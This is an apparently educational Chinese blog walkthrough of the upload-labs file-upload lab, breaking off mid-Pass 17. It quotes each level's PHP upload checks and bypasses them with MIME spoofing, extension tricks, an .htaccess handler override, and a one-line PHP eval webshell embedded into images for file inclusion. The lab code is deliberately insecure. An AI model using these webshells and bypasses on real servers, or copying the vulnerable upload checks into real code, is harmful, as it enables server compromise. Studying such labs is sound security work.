<h2 id="Pass-2-白名单MIME绕过"><a href="#Pass-2-白名单MIME绕过" class="headerlink" title="Pass 2(白名单MIME绕过)"></a>Pass 2(白名单MIME绕过)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>源代码为检测content-type</p>
<blockquote>
<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
<p>$_FILES[‘myfile’][‘name’]</p>
<p>$_FILES[‘myfile’][‘size’]</p>
<p>$_FILES[‘myfile’][‘type’]</p>
</blockquote>
<blockquote>
<p>&lt;form …&gt;<br> &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br> …<br>&lt;&#x2F;form&gt;</p>
</blockquote>
<p>bp改正即可。</p>
<h3 id="Pass-3-黑名单特殊名解析"><a href="#Pass-3-黑名单特殊名解析" class="headerlink" title="Pass 3(黑名单特殊名解析)"></a>Pass 3(黑名单特殊名解析)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">      <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">      <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">      <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">          <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">          <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">               <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>trim(a,b) 去掉a中的b字符或去空</p>
</blockquote>
<blockquote>
<p>strrch(a,b) 截取字符串a中，从b开始到结束的子串，如：</p>
<p>echo strrchr(“I love Shanghai!”,”Shanghai”);即显示Shanghai!</p>
</blockquote>
<blockquote>
<p>in_array(search,array)，在后者数组中搜索特定值，如：</p>
<p>$people &#x3D; array(“Bill”, “Steve”, “Mark”, “David”);</p>
<p>if (in_array(“Mark”, $people))<br>      {<br>      echo “匹配已找到”;<br>      }</p>
</blockquote>
<p>最后完成了时间重命名。</p>
<p>如上，有些黑名单，但有些其他的文件比如php5，phtml，php3</p>
<h3 id="Pass-4-黑名单-htaccess"><a href="#Pass-4-黑名单-htaccess" class="headerlink" title="Pass 4(黑名单.htaccess)"></a>Pass 4(黑名单.htaccess)</h3><p><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</code></p>
<p>法1：</p>
<p>当.htaccess文件被放置在一个 “通过Apache Web服务器加载 “的目录中时，.htaccess文件会被Apache Web服务器软件检测并执行。这些.htaccess文件可以用来改变Apache Web服务器软件的配置，以启用&#x2F;禁用Apache Web服务器软件所提供的额外功能和特性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;mm.jpg&quot;&gt; </span><br><span class="line"></span><br><span class="line">setHandler application/x-httpd-php </span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt; </span><br></pre></td></tr></table></figure>

<p>将mm.jpg以php解析</p>
<p>条件：</p>
<ul>
<li>apache服务器</li>
<li>能够上传.htaccess文件</li>
<li>httpd.conf中AllowOverride All</li>
<li>httpd.conf中有LoadModule rewrite_module modules&#x2F;mod_rewrite.so</li>
<li>上传目录具有可执行权限</li>
</ul>
<p>法2：</p>
<p>由代码知，去空格，删除点，去除::$DATA等都只执行一次，所以bp修改后缀名**php. .**即可</p>
<h2 id="Pass-5-黑名单-user-ini-x2F-代码审计"><a href="#Pass-5-黑名单-user-ini-x2F-代码审计" class="headerlink" title="Pass 5(黑名单.user.ini&#x2F;代码审计)"></a>Pass 5(黑名单.user.ini&#x2F;代码审计)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>法1：构造后缀名.php. .</p>
<p>法2：.user.ini</p>
<h2 id="Pass-6-黑名单大小写"><a href="#Pass-6-黑名单大小写" class="headerlink" title="Pass 6(黑名单大小写)"></a>Pass 6(黑名单大小写)</h2><p>少了strtolower函数，故bp改下php后缀大小写即可。</p>
<h2 id="Pass-7-黑名单空格绕过"><a href="#Pass-7-黑名单空格绕过" class="headerlink" title="Pass 7(黑名单空格绕过)"></a>Pass 7(黑名单空格绕过)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>代码没有trim()函数，bp构造**.php(空格)** 即可</p>
<h2 id="Pass-8-黑名单"><a href="#Pass-8-黑名单" class="headerlink" title="Pass 8(黑名单)"></a>Pass 8(黑名单)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>); </span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>没有delot()函数，</p>
<p>**构造后缀.php.**即可</p>
<h2 id="Pass-9-黑名单"><a href="#Pass-9-黑名单" class="headerlink" title="Pass 9(黑名单)"></a>Pass 9(黑名单)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">       <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">       <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass 13"></a>Pass 13</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>strrpos(a,b):b在a字符串中最后一次出现的位置</p>
</blockquote>
<h1 id="Pass-14-21-内容逻辑数组绕过"><a href="#Pass-14-21-内容逻辑数组绕过" class="headerlink" title="Pass 14-21(内容逻辑数组绕过)"></a>Pass 14-21(内容逻辑数组绕过)</h1><p>图片马制作：</p>
<p>法1:notepad++，直接打开图片，末尾加代码</p>
<p><code>&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;</code></p>
<p>法2:控制台执行copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg</p>
<p>&#x2F;a二进制打开，&#x2F;b以ASCII码形式打开</p>
<h2 id="Pass-14-图片码-文件包含漏洞"><a href="#Pass-14-图片码-文件包含漏洞" class="headerlink" title="Pass 14(图片码+文件包含漏洞)"></a>Pass 14(图片码+文件包含漏洞)</h2><blockquote>
<p>上传<code>图片马</code>到服务器。</p>
<p>注意：</p>
<p>1.保证上传后的图片马中仍然包含完整的<code>一句话</code>或<code>webshell</code>代码。</p>
<p>2.使用<a href="http://localhost:81/uploadlabs/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。</p>
<p>3.图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！</p>
</blockquote>
<p>文件头检测：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>文件包含漏洞执行后门代码</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230526224245825.png" alt="image-20230526224245825"></p>
<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass 15"></a>Pass 15</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getimagesize():返回图像的尺寸以及文件类型和 height/width 文本字符串，以在标准 HTML IMG 标签和对应的 HTTP 内容类型中使用。</span><br></pre></td></tr></table></figure>

<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass 16"></a>Pass 16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>服务器配置说明：</p>
<p>1.在php.ini文件中找到;extension&#x3D;php_exif.dll，去掉前面的分号<br>2.在php.ini文件中找到;extension&#x3D;php_mbstring.dll，去掉前面的分号，并将此行移动到extension&#x3D;php_exif.dll之前，使之首先加载*。</p>
<p>3.找到[exif]段，把下面语句的分号去掉。</p>
<p>;exif.encode_unicode &#x3D; ISO-8859-15<br>        ;exif.decode_unicode_motorola &#x3D; UCS-2BE<br>        ;exif.decode_unicode_intel &#x3D; UCS-2LE<br>        ;exif.encode_jis &#x3D;<br>        ;exif.decode_jis_motorola &#x3D; JIS<br>        ;exif.decode_jis_intel &#x3D; JIS重启php</p>
</blockquote>
<blockquote>
<p>exif_imagetype():<strong>读取一个图像的第一个字节并检查其签名</strong></p>
</blockquote>
<h2 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass 17(二次渲染)"></a>Pass 17(二次渲染)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span 